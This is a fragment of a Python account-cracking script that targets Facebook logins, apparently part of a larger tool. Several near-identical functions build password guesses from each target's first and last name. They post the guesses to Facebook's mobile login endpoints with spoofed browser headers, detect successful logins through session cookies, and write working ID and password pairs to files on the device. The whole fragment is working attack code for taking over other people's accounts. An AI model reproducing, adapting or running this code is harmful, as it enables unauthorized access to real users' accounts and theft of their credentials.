                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        JIHAD=session.cookies.get_dict().keys()
                        if "c_user" in JIHAD:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [JIHAD\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/JIHAD•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in JIHAD:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [JIHAD•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/JIHAD•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
                        
def m3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [JIHAD] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        JIHAD=session.cookies.get_dict().keys()
                        if "c_user" in JIHAD:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [JIHAD\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/JIHAD•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in JIHAD:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [JIHAD•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/JIHAD•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [JIHAD] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="111", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        JIHAD=session.cookies.get_dict().keys()
                        if "c_user" in JIHAD:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [JIHAD\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/JIHAD•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in JIHAD:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [JIHAD•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/JIHAD•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [JIHAD] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        JIHAD=session.cookies.get_dict().keys()
                        if "c_user" in JIHAD:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [JIHAD\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/JIHAD•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in JIHAD:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [JIHAD•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/JIHAD•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

JIHADALWAYSONFIRE()
JIHAD()'))